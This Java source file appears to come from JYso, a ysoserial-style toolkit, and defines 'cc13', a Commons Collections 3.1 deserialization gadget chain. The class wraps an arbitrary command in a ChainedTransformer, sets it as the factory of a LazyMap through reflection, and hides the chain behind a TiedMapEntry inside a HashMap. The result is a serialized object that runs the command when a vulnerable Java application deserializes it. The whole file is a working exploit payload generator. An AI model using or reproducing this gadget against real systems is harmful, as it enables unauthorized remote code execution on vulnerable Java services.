package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.Reflections;
import com.qi4l.JYso.gadgets.utils.cc.TransformerUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.UNAM4})
public class cc13 implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        final Transformer[] transformers     = TransformerUtil.makeTransformer(command);
        Transformer         transformerChain = new ChainedTransformer(transformers);
        Map                 decorate         = LazyMap.decorate(new HashMap(), new ConstantFactory(1));
        TiedMapEntry        tiedMapEntry     = new TiedMapEntry(decorate, 1);
        HashMap             hashMap          = Gadgets.maskmapToString(tiedMapEntry, tiedMapEntry);

        Reflections.setFieldValue(decorate, "factory", transformerChain);
        Reflections.setFieldValue(tiedMapEntry, "key", 233);

        return hashMap;
        //return hashtable;
    }

}
